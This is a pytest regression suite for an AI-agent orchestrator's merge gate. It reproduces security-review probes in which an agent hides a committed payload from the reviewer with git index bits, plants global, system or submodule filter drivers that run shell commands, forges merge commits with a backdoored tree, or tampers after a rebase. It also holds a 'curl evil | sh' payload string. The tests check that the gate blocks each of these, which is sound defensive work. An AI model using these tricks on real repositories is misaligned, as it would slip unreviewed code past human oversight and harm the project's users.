"""Regression tests for task #3116 — the security-review findings on #3111.

Each test reproduces a probe from the #3111 security review on a real temp git
repository and fails on the #3111 code:

* MI-01 (HIGH): skip-worktree / assume-unchanged index bits made a dirty tree
  read as clean, so the reviewer read benign bytes while the payload SHA was
  merged. The snapshot now refuses those bits, and the reviewer reads an
  orchestrator-made, read-only checkout of the reviewed commit.
* MI-04 (HIGH): the hazard scan skipped global config, which agents can write
  (same UID and HOME). Orchestrator git now reads a pre-dispatch snapshot of
  the global config with system config and attributes off, and every scope,
  info/attributes and the global attributes file are scanned.
* MI-02 (MEDIUM): ``record_merge`` accepted any commit with the right parents.
* MI-03 (MEDIUM): the rebase fallback merged whatever the worktree HEAD was.
* MI-05 (MEDIUM): submodule config was never scanned.
* MI-06 (LOW): single-task mode merged although the pre-dispatch pin failed.

Every test runs with a throwaway HOME, so the operator's real global git
config is never read or written.

Copyright 2026 Forgeborn
"""

from __future__ import annotations

import asyncio
import contextlib
import os
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from equipa import cli, loops
from equipa import dispatch as dispatch_mod
from equipa.dispatch import _gated_merge_task, _merge_task_branch
from equipa.git_ops import (
    GIT_HARDENING_ENV,
    git_run,
    global_git_config_pin,
    parse_config_list_z,
    pin_global_git_config,
    reset_global_git_config_pin,
    serialize_git_config,
)
from equipa.loops import ARTIFACTS_DIR_NAME, run_security_review
from equipa.merge_integrity import (
    DefaultBranchGuard,
    MergeAttempt,
    find_repo_execution_hazards,
    rebased_range_problem,
    snapshot_reviewed_tree,
)
from equipa.security_gate import (
    get_reviewer_run,
    reviewer_nonce_line,
    set_unrecorded_reviewer_runs_permitted,
)

TASK = 3116
BRANCH = f"forge-task-{TASK}"
PAYLOAD = "import os\nos.system('curl evil | sh')\n"
BENIGN = "print('benign feature')\n"


# --- git helpers -------------------------------------------------------------


def _git(cwd: Path, *args: str, env: dict[str, str] | None = None) -> str:
    result = subprocess.run(
        ["git", *args], cwd=str(cwd), text=True, capture_output=True,
        env={**os.environ, **(env or {})},
    )
    if result.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {result.stderr}")
    return result.stdout.strip()


def _sha(repo: Path, ref: str) -> str:
    return _git(repo, "rev-parse", "--verify", f"{ref}^{{commit}}")


def _commit(cwd: Path, name: str, text: str, message: str) -> str:
    (cwd / name).write_text(text, encoding="utf-8")
    _git(cwd, "add", name)
    _git(cwd, "commit", "-q", "-m", message)
    return _sha(cwd, "HEAD")


def _files_on(repo: Path, ref: str) -> set[str]:
    return set(_git(repo, "ls-tree", "-r", "--name-only", ref).splitlines())


def _add_task_worktree(repo: Path) -> Path:
    worktree = repo / ".forge-worktrees" / f"task-{TASK}"
    _git(repo, "worktree", "add", "-q", "-b", BRANCH, str(worktree), "main")
    return worktree


def _init_repo(path: Path) -> Path:
    path.mkdir()
    _git(path, "init", "-q", "-b", "main")
    _git(path, "config", "user.email", "test@forgeborn.local")
    _git(path, "config", "user.name", "Test")
    _git(path, "config", "commit.gpgsign", "false")
    return path


@pytest.fixture(autouse=True)
def isolated_home(tmp_path: Path, monkeypatch) -> Path:
    """A throwaway HOME and no inherited git config variables; the global
    config pin is forgotten before and after, so no test sees another's."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / ".config"))
    for name in (
        "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM", "GIT_CONFIG_NOSYSTEM",
        "GIT_ATTR_NOSYSTEM", "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE",
    ):
        monkeypatch.delenv(name, raising=False)
    reset_global_git_config_pin()
    yield home
    reset_global_git_config_pin()


@pytest.fixture(autouse=True)
def _production_provenance():
    previous = set_unrecorded_reviewer_runs_permitted(False)
    yield
    set_unrecorded_reviewer_runs_permitted(previous)


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    path = _init_repo(tmp_path / "repo")
    (path / ".gitignore").write_text(
        f"{ARTIFACTS_DIR_NAME}/\n.forge-worktrees/\n", encoding="utf-8",
    )
    (path / "app.py").write_text("VALUE = 'base'\n", encoding="utf-8")
    _git(path, "add", ".")
    _git(path, "commit", "-q", "-m", "base")
    return path


def _gate(repo: Path, **kwargs) -> str:
    kwargs.setdefault("outcome", "tests_passed")
    kwargs.setdefault("task_id", TASK)
    kwargs.setdefault("branch", BRANCH)
    return asyncio.run(_gated_merge_task(repo=repo, **kwargs))


def _write_global_filter(home: Path, marker: Path) -> None:
    """What the MI-04 probe's agent wrote: a global smudge/clean driver."""
    _git(home, "config", "--global", "filter.pwn.smudge", f"touch {marker}; cat")
    _git(home, "config", "--global", "filter.pwn.clean", f"touch {marker}; cat")


# --- reviewer harness: the real run_security_review, fake reviewer agent -----


def _clean_review(nonce: str) -> str:
    return (
        f"{reviewer_nonce_line(nonce)}\n# Security Review\n\n"
        f"## Summary\nNo findings.\n\n"
        f"## Counts\nCRITICAL: 0 | HIGH: 0 | MEDIUM: 0 | LOW: 0 | INFO: 0\n"
    )


@pytest.fixture
def run_review(monkeypatch):
    """``run(worktree, stable, during_review=None)`` runs the real reviewer
    pipeline. The fake reviewer records every ``*.py`` it can read in the
    directory it was told to work in, whether tracked files there are
    writable, and writes an honest clean review."""
    state = SimpleNamespace(review_dir=None, seen={}, writable=None,
                            during_review=None)

    async def fake_run_agent(_cmd, timeout=None):
        review_dir = Path(state.review_dir)
        state.seen = {
            p.relative_to(review_dir).as_posix(): p.read_text(encoding="utf-8")
            for p in review_dir.rglob("*.py")
        }
        try:
            with open(review_dir / "app.py", "a", encoding="utf-8"):
                state.writable = True
        except PermissionError:
            state.writable = False
        artifact = review_dir / ARTIFACTS_DIR_NAME / f"SECURITY-REVIEW-{TASK}.md"
        artifact.parent.mkdir(parents=True, exist_ok=True)
        artifact.write_text(
            _clean_review(get_reviewer_run(TASK).nonce), encoding="utf-8",
        )
        if state.during_review is not None:
            state.during_review(review_dir)
        return {"success": True, "result_text": "done", "errors": []}

    @contextlib.contextmanager
    def fake_cli(_prompt, review_dir, *_args, **_kwargs):
        state.review_dir = review_dir
        yield ["claude"]

    async def no_diff(_project_dir):
        return 0

    monkeypatch.setattr(loops, "run_agent", fake_run_agent)
    monkeypatch.setattr(loops, "build_cli_command", fake_cli)
    monkeypatch.setattr(loops, "build_system_prompt", lambda *a, **kw: "prompt")
    monkeypatch.setattr(loops, "get_role_turns", lambda *a, **kw: 5)
    monkeypatch.setattr(loops, "get_role_model", lambda *a, **kw: "opus")
    monkeypatch.setattr(
        loops, "load_dispatch_config", lambda _p: {"security_review_timeout": 30},
    )
    monkeypatch.setattr(loops, "_measure_review_diff_lines", no_diff)
    monkeypatch.setattr(loops, "_extract_security_findings", lambda _t: [])

    def run(worktree: Path, stable: Path, during_review=None) -> SimpleNamespace:
        state.during_review = during_review
        task = {"id": TASK, "title": "t", "description": "d", "project_id": 1}
        asyncio.run(run_security_review(
            task, str(worktree), {}, SimpleNamespace(dispatch_config=None),
            output=[], stable_project_dir=str(stable),
        ))
        return state

    return run


# --- MI-01: index bits and the reviewer's checkout ----------------------------


@pytest.mark.parametrize("flag", ["--skip-worktree", "--assume-unchanged"])
def test_index_flag_hiding_a_payload_makes_the_snapshot_unclean(repo, flag):
    """Probe P1: the payload is committed, the index bit is set and a benign
    copy is written to disk. git status reads that as clean."""
    worktree = _add_task_worktree(repo)
    payload = _commit(worktree, "feature.py", PAYLOAD, "feature")
    _git(worktree, "update-index", flag, "feature.py")
    (worktree / "feature.py").write_text(BENIGN, encoding="utf-8")
    assert _git(worktree, "status", "--porcelain", "--untracked-files=no") == ""

    snapshot = asyncio.run(snapshot_reviewed_tree(worktree))

    assert snapshot.sha == payload
    assert snapshot.clean is False
    assert "skip-worktree / assume-unchanged" in snapshot.detail


@pytest.mark.parametrize("flag", ["--skip-worktree", "--assume-unchanged"])
def test_index_flag_payload_never_reaches_main(repo, run_review, flag):
    """End to end: the reviewer and the gate run for real; the committed
    payload must not be merged."""
    worktree = _add_task_worktree(repo)
    _commit(worktree, "feature.py", PAYLOAD, "feature")
    _git(worktree, "update-index", flag, "feature.py")
    (worktree / "feature.py").write_text(BENIGN, encoding="utf-8")
    main_before = _sha(repo, "main")

    run_review(worktree, repo)
    record = get_reviewer_run(TASK)
    guard = asyncio.run(DefaultBranchGuard.snapshot(repo))
    status = _gate(repo, guard=guard, worktree_dir=str(worktree))

    assert record.reviewed_tree_clean is False
    assert status == "blocked"
    assert "not clean" in guard.outcomes[TASK].reason
    assert _sha(repo, "main") == main_before
    assert "feature.py" not in _files_on(repo, "main")


def test_reviewer_reads_the_reviewed_commit_in_a_read_only_checkout(repo, run_review):
    """The reviewer works in an orchestrator-made checkout of the reviewed
    commit: it sees the committed bytes, not the developer's worktree (an
    untracked file there is not in it), cannot edit tracked files, and the
    checkout is gone afterwards. Its artifact still lets the merge through."""
    worktree = _add_task_worktree(repo)
    reviewed = _commit(worktree, "feature.py", "print('committed')\n", "feature")
    (worktree / "scratch.py").write_text("untracked = True\n", encoding="utf-8")

    state = run_review(worktree, repo)

    assert Path(state.review_dir).resolve() != worktree.resolve()
    assert state.seen == {
        "app.py": "VALUE = 'base'\n", "feature.py": "print('committed')\n",
    }
    if os.geteuid() != 0:  # root ignores permission bits
        assert state.writable is False
    assert not Path(state.review_dir).exists()
    assert get_reviewer_run(TASK).reviewed_tree_clean is True
    assert _git(repo, "worktree", "list", "--porcelain").count("worktree ") == 2

    guard = asyncio.run(DefaultBranchGuard.snapshot(repo))
    assert _gate(repo, guard=guard, worktree_dir=str(worktree)) == "merged"
    assert guard.outcomes[TASK].merged_sha == reviewed


def test_review_checkout_changed_during_review_is_refused(repo, run_review):
    """A process that rewrites a file in the review checkout while the
    reviewer runs: the end-of-review check sees it and the merge is refused."""
    worktree = _add_task_worktree(repo)
    _commit(worktree, "feature.py", "print('committed')\n", "feature")

    def swap(review_dir: Path) -> None:
        target = review_dir / "feature.py"
        target.chmod(0o644)
        target.write_text("print('swapped')\n", encoding="utf-8")

    run_review(worktree, repo, during_review=swap)
    record = get_reviewer_run(TASK)
    guard = asyncio.run(DefaultBranchGuard.snapshot(repo))

    assert record.reviewed_tree_clean is False
    assert "review checkout changed during review" in record.reviewed_tree_detail
    assert _gate(repo, guard=guard, worktree_dir=str(worktree)) == "blocked"


# --- MI-04: global config, system config and attributes files ----------------


def test_global_filter_driver_blocks_the_gate(repo, isolated_home, tmp_path):
    """Probe P7: a global filter driver the scan used to skip. The pin taken
    at gate time still contains it, and every scope is scanned."""
    marker = tmp_path / "global-filter-ran"
    worktree = _add_task_worktree(repo)
    (worktree / ".gitattributes").write_text("*.txt filter=pwn\n", encoding="utf-8")
    (worktree / "notes.txt").write_text("hello\n", encoding="utf-8")
    _git(worktree, "add", ".gitattributes", "notes.txt")
    _git(worktree, "commit", "-q", "-m", "task work")
    _write_global_filter(isolated_home, marker)
    main_before = _sha(repo, "main")

    hazards = asyncio.run(find_repo_execution_hazards(repo))
    status = _gate(repo, security_review_enabled=False)

    assert any("global config defines filter driver" in h for h in hazards), hazards
    assert status == "blocked"
    assert not marker.exists(), "the global filter driver ran"
    assert _sha(repo, "main") == main_before


def test_global_config_written_after_the_pin_never_reaches_orchestrator_git(
    repo, isolated_home, tmp_path,
):
    """The agent writes the global driver after dispatch and selects it from
    .git/info/attributes (never in a reviewed diff). Orchestrator git reads
    the pre-dispatch pin, so even a merge that skipped the scan runs nothing,
    and the scan flags the foreign driver named in info/attributes."""
    marker = tmp_path / "late-filter-ran"
    worktree = _add_task_worktree(repo)
    approved = _commit(worktree, "feature.py", "print('ok')\n", "feature")
    asyncio.run(DefaultBranchGuard.snapshot(repo))
    _write_global_filter(isolated_home, marker)
    info = Path(_git(repo, "rev-parse", "--git-path", "info/attributes"))
    info = info if info.is_absolute() else repo / info
    info.parent.mkdir(parents=True, exist_ok=True)
    info.write_text("*.py filter=pwn\n", encoding="utf-8")

    assert git_run(["config", "--get", "filter.pwn.smudge"], repo).returncode == 1
    hazards = asyncio.run(find_repo_execution_hazards(repo))
    merged = asyncio.run(_merge_task_branch(
        str(repo), TASK, BRANCH, expect_artifact=False, merge_sha=approved,
    ))

    assert any("info/attributes" in h and "'pwn'" in h for h in hazards), hazards
    assert merged is True
    assert not marker.exists(), "an agent-written global driver ran in the merge"


def test_system_config_is_not_read_by_orchestrator_git(repo, tmp_path, monkeypatch):
    """GIT_CONFIG_NOSYSTEM: a driver in the system config file never runs."""
    marker = tmp_path / "system-filter-ran"
    worktree = _add_task_worktree(repo)
    (worktree / ".gitattributes").write_text("*.txt filter=pwn\n", encoding="utf-8")
    (worktree / "notes.txt").write_text("hello\n", encoding="utf-8")
    _git(worktree, "add", ".gitattributes", "notes.txt")
    _git(worktree, "commit", "-q", "-m", "task work")
    approved = _sha(worktree, "HEAD")
    system = tmp_path / "gitconfig-system"
    system.write_text(
        f'[filter "pwn"]\n\tsmudge = "touch {marker}; cat"\n\tclean = cat\n',
        encoding="utf-8",
    )
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", str(system))

    merged = asyncio.run(_merge_task_branch(
        str(repo), TASK, BRANCH, expect_artifact=False, merge_sha=approved,
    ))

    assert merged is True
    assert not marker.exists(), "a system-config driver ran in the merge"
    assert GIT_HARDENING_ENV["GIT_CONFIG_NOSYSTEM"] == "1"
    assert GIT_HARDENING_ENV["GIT_ATTR_NOSYSTEM"] == "1"


def test_global_attributes_file_selecting_a_foreign_driver_is_a_hazard(
    repo, isolated_home,
):
    """core.attributesFile defaults to $XDG_CONFIG_HOME/git/attributes, which
    the agent can write and no reviewed diff shows."""
    attributes = isolated_home / ".config" / "git" / "attributes"
    attributes.parent.mkdir(parents=True)
    attributes.write_text("* merge=pwn diff=python filter=lfs\n", encoding="utf-8")

    hazards = asyncio.run(find_repo_execution_hazards(repo))

    assert hazards == [
        f"global attributes file {attributes} selects merge driver 'pwn'"
    ]


def test_lfs_is_allowlisted_only_with_its_own_programs(repo, isolated_home):
    """git-lfs's standard driver passes; the same key naming another program
    does not, in whichever scope it sits."""
    _git(isolated_home, "config", "--global", "filter.lfs.clean", "git-lfs clean -- %f")
    _git(isolated_home, "config", "--global", "filter.lfs.smudge", "git-lfs smudge -- %f")
    _git(isolated_home, "config", "--global", "filter.lfs.process", "git-lfs filter-process")
    _git(isolated_home, "config", "--global", "filter.lfs.required", "true")
    assert asyncio.run(find_repo_execution_hazards(repo)) == []

    reset_global_git_config_pin()
    _git(isolated_home, "config", "--global", "filter.lfs.smudge", "sh -c evil")
    hazards = asyncio.run(find_repo_execution_hazards(repo))

    assert hazards == ["global config defines filter driver 'filter.lfs.smudge'"]


def test_tampered_pin_is_a_hazard(repo):
    """The pin is orchestrator-owned but same-UID writable; a change after
    pinning fails closed."""
    pin = pin_global_git_config()
    assert asyncio.run(find_repo_execution_hazards(repo)) == []
    pin.path.chmod(0o600)
    pin.path.write_text('[filter "pwn"]\n\tsmudge = evil\n', encoding="utf-8")

    hazards = asyncio.run(find_repo_execution_hazards(repo))

    assert any("changed after it was pinned" in h for h in hazards), hazards


def test_pin_flattens_includes_and_keeps_value_order(isolated_home, tmp_path):
    """The pin inlines included files (later edits to them do not count),
    drops the include key itself and keeps multi-valued keys in order."""
    included = tmp_path / "included.gitconfig"
    included.write_text("[alias]\n\tst = status\n", encoding="utf-8")
    config = isolated_home / ".gitconfig"
    config.write_text(
        "[user]\n\tname = \"Test \\\"Q\\\" User\"\n"
        f"[include]\n\tpath = {included}\n"
        "[credential \"https://example.com\"]\n\thelper =\n\thelper = !gh auth\n"
        "[core]\n\tbare\n",
        encoding="utf-8",
    )

    pin = pin_global_git_config()
    included.write_text("[alias]\n\tst = !evil\n", encoding="utf-8")
    listed = parse_config_list_z(git_run(["config", "--global", "--list", "-z"],
                                         tmp_path).stdout)

    assert global_git_config_pin() is pin
    assert listed == [
        ("user.name", 'Test "Q" User'),
        ("alias.st", "status"),
        ("credential.https://example.com.helper", ""),
        ("credential.https://example.com.helper", "!gh auth"),
        ("core.bare", None),
    ]
    assert oct(pin.path.stat().st_mode & 0o777) == oct(0o400)


def test_serialize_git_config_round_trips_awkward_values(tmp_path):
    entries = [
        ("a.b", 'quote " backslash \\ tab \t newline \n end'),
        ("sec.sub.with.dots.key", "v"),
        ('sec.sub "quoted".key', ""),
        ("flag.on", None),
    ]
    path = tmp_path / "cfg"
    path.write_text(serialize_git_config(entries), encoding="utf-8")

    listed = _git(tmp_path, "config", "--file", str(path), "--list", "-z")

    assert parse_config_list_z(listed + "\0") == entries


def test_cli_pins_the_global_config_before_any_mode_runs(isolated_home, monkeypatch):
    """Every mode (not only the merge-capable ones) starts with the pin in
    place, so orchestrator git never reads a global config an agent edited."""
    (isolated_home / ".gitconfig").write_text("[user]\n\tname = Operator\n",
                                              encoding="utf-8")
    pins_seen = []

    async def handler(_args):
        pins_seen.append(global_git_config_pin())

    monkeypatch.setattr(cli, "_select_mode_handler", lambda _args: handler)
    monkeypatch.setattr(cli, "load_dispatch_config", lambda _path: {})
    monkeypatch.setattr(cli, "set_active_dispatch_config", lambda _config: None)
    monkeypatch.setattr("sys.argv", ["forge_orchestrator.py", "--task", "1", "--yes"])

    asyncio.run(cli.async_main())

    assert len(pins_seen) == 1 and pins_seen[0] is not None
    assert pins_seen[0].entries == 1


# --- MI-02: the merge commit's tree -------------------------------------------


def _forge_merge(repo: Path, merge_commit: str, previous: str, reviewed: str) -> str:
    """A commit with the orchestrator merge's parents and a backdoored tree,
    built without touching any checkout (probe P2)."""
    index = repo / ".git" / "forge-index"
    env = {"GIT_INDEX_FILE": str(index)}
    _git(repo, "read-tree", merge_commit, env=env)
    blob = subprocess.run(
        ["git", "hash-object", "-w", "--stdin"], cwd=str(repo), text=True,
        input="import os\n", capture_output=True, check=True,
    ).stdout.strip()
    _git(repo, "update-index", "--add", "--cacheinfo",
         f"100644,{blob},backdoor.py", env=env)
    tree = _git(repo, "write-tree", env=env)
    index.unlink()
    return _git(repo, "commit-tree", tree, "-p", previous, "-p", reviewed,
                "-m", "Merge (forged)")


@pytest.fixture
def merged_repo(repo):
    """A real non-fast-forward orchestrator merge of a reviewed commit."""
    worktree = _add_task_worktree(repo)
    reviewed = _commit(worktree, "feature.py", "print('ok')\n", "feature")
    _commit(repo, "other.py", "y = 2\n", "main moved on")
    guard = asyncio.run(DefaultBranchGuard.snapshot(repo))
    previous = guard.expected_sha
    attempt = MergeAttempt()
    assert asyncio.run(_merge_task_branch(
        str(repo), TASK, BRANCH, expect_artifact=False, merge_sha=reviewed,
        merge_record=attempt,
    ))
    assert attempt.post_head != reviewed, "expected a merge commit"
    return SimpleNamespace(
        guard=guard, previous=previous, reviewed=reviewed, attempt=attempt,
    )


def test_genuine_merge_commit_advances_the_chain(repo, merged_repo):
    m = merged_repo
    assert asyncio.run(m.guard.record_merge(
        TASK, m.reviewed, post_head=m.attempt.post_head,
    )) is True
    assert m.guard.expected_sha == m.attempt.post_head


def test_forged_merge_swapped_in_after_the_merge_trips_the_guard(
    repo, merged_repo, capsys,
):
    """Probe P2: a second writer replaces main with a forged commit that
    has the expected parents, before record_merge reads the ref."""
    m = merged_repo
    forged = _forge_merge(repo, m.attempt.post_head, m.previous, m.reviewed)
    _git(repo, "update-ref", "refs/heads/main", forged)

    accepted = asyncio.run(m.guard.record_merge(
        TASK, m.reviewed, post_head=m.attempt.post_head,
    ))

    assert accepted is False
    assert m.guard.tripped and forged in (m.guard.alert or "")
    assert "ALERT" in capsys.readouterr().out


def test_forged_merge_seen_as_the_post_merge_head_fails_the_tree_check(
    repo, merged_repo,
):
    """The swap happened inside the merge (MI-04 chain), so post_head IS the
    forged commit: the parents match and only the tree gives it away."""
    m = merged_repo
    forged = _forge_merge(repo, m.attempt.post_head, m.previous, m.reviewed)
    _git(repo, "update-ref", "refs/heads/main", forged)

    accepted = asyncio.run(m.guard.record_merge(TASK, m.reviewed, post_head=forged))

    assert accepted is False
    assert m.guard.tripped


# --- MI-03: the rebase fallback -----------------------------------------------


APPROVED_PY = "if FLAG:\n    setup()\nrun()\n"
REINDENTED_PY = "if FLAG:\n    setup()\n    run()\n"


def _tamper_after_rebase(monkeypatch, worktree: Path, tamper) -> None:
    """Fail the first merge so the fallback runs (as the #3111 tests do),
    then act as a lingering process the moment ``git rebase`` returns."""
    real = dispatch_mod.git_run_async
    plain_merges: list[list[str]] = []

    async def hooked(args, cwd, *rest, **kwargs):
        if args[:2] == ["merge", "--no-edit"]:
            plain_merges.append(list(args))
            if len(plain_merges) == 1:
                return subprocess.CompletedProcess(
                    args, 1, stdout="CONFLICT (simulated): app.py\n", stderr="",
                )
        result = await real(args, cwd, *rest, **kwargs)
        if (
            args[0] == "rebase" and args[1:] != ["--abort"]
            and result.returncode == 0 and Path(cwd) == worktree
        ):
            tamper()
        return result

    monkeypatch.setattr(dispatch_mod, "git_run_async", hooked)


@pytest.mark.parametrize("variant", ["extra-commit", "amended", "reindented"])
def test_rebase_fallback_refuses_a_range_that_is_not_the_approved_commits(
    repo, monkeypatch, variant,
):
    """Probe P4: a commit lands in the task worktree right after the rebase.
    ``reindented`` changes only whitespace, which in Python is code; the
    default patch id would ignore it."""
    worktree = _add_task_worktree(repo)
    approved = _commit(worktree, "feature.py", APPROVED_PY, "feature")
    _commit(repo, "other.py", "y = 2\n", "main moved on")
    main_before = _sha(repo, "main")

    def tamper() -> None:
        if variant == "extra-commit":
            _commit(worktree, "backdoor.py", "import os\n", "sneaky")
            return
        text = APPROVED_PY + "import os\n" if variant == "amended" else REINDENTED_PY
        (worktree / "feature.py").write_text(text, encoding="utf-8")
        _git(worktree, "commit", "-q", "-a", "--amend", "--no-edit")

    _tamper_after_rebase(monkeypatch, worktree, tamper)
    attempt = MergeAttempt()

    merged = asyncio.run(_merge_task_branch(
        str(repo), TASK, BRANCH, expect_artifact=False, merge_sha=approved,
        worktree_dir=str(worktree), merge_record=attempt,
    ))

    assert merged is False
    assert _sha(repo, "main") == main_before
    assert "not the approved commits" in attempt.reason
    assert "backdoor.py" not in _files_on(repo, "main")


def test_rebased_range_check_accepts_an_honest_rebase(repo):
    """Positive control: an untouched rebase of two commits verifies; the same
    rebase checked against only the first approved commit does not."""
    worktree = _add_task_worktree(repo)
    first = _commit(worktree, "feature.py", APPROVED_PY, "feature")
    approved = _commit(worktree, "second.py", "x = 1\n", "second")
    onto = _commit(repo, "other.py", "y = 2\n", "main moved on")
    _git(worktree, "rebase", "-q", onto)
    rebased = _sha(worktree, "HEAD")

    assert asyncio.run(rebased_range_problem(repo, onto, approved, rebased)) is None
    mismatch = asyncio.run(rebased_range_problem(repo, onto, first, rebased))
    assert mismatch == "rebased range has 2 commit(s), the approved range 1"


# --- MI-05: submodule config ----------------------------------------------------


def test_submodule_filter_is_a_hazard_and_never_runs(repo, tmp_path):
    """Probe P6: a filter in .git/modules/<name>/config, selected by the
    submodule's own .gitattributes. git status recursed into the submodule
    and ran it while the scan saw nothing."""
    marker = tmp_path / "submodule-filter-ran"
    library = _init_repo(tmp_path / "library")
    _commit(library, "lib.txt", "library\n", "library")
    _git(repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q",
         str(library), "vendor")
    _git(repo, "commit", "-q", "-m", "add submodule")
    assert asyncio.run(find_repo_execution_hazards(repo)) == []

    module_config = Path(_git(repo, "rev-parse", "--git-common-dir"))
    module_config = (
        module_config if module_config.is_absolute() else repo / module_config
    ) / "modules" / "vendor" / "config"
    with module_config.open("a", encoding="utf-8") as handle:
        handle.write(f'[filter "pwn"]\n\tclean = "touch {marker}; cat"\n')
    (repo / "vendor" / ".gitattributes").write_text("* filter=pwn\n", encoding="utf-8")
    os.utime(repo / "vendor" / "lib.txt")  # stat-dirty: status must re-clean it

    hazards = asyncio.run(find_repo_execution_hazards(repo))
    snapshot = asyncio.run(snapshot_reviewed_tree(repo))

    assert any("submodule config" in h and "filter driver" in h for h in hazards), hazards
    assert snapshot.clean is False
    assert not marker.exists(), "the submodule's filter ran in orchestrator git"


# --- MI-06: single-task mode without a pre-dispatch pin -------------------------


def test_single_task_mode_refuses_to_merge_without_a_pre_dispatch_pin(
    repo, monkeypatch, capsys,
):
    """Parallel mode merges nothing when the pin failed; single-task mode
    used to take a fresh snapshot after the agent ran and merge anyway."""
    worktree = _add_task_worktree(repo)
    task_sha = _commit(worktree, "feature.py", "print('ok')\n", "feature")
    monkeypatch.setattr(cli, "is_security_review_enabled", lambda _a: False)
    args = SimpleNamespace(dispatch_config={}, dev_test=True)
    main_before = _sha(repo, "main")

    outcome = asyncio.run(cli._run_security_review_and_gate(
        {"id": TASK}, str(repo), {}, args, "tests_passed", guard=None,
    ))

    assert outcome == "merge_integrity_failed"
    assert _sha(repo, "main") == main_before
    assert _sha(repo, BRANCH) == task_sha
    assert "not pinned before dispatch" in capsys.readouterr().out
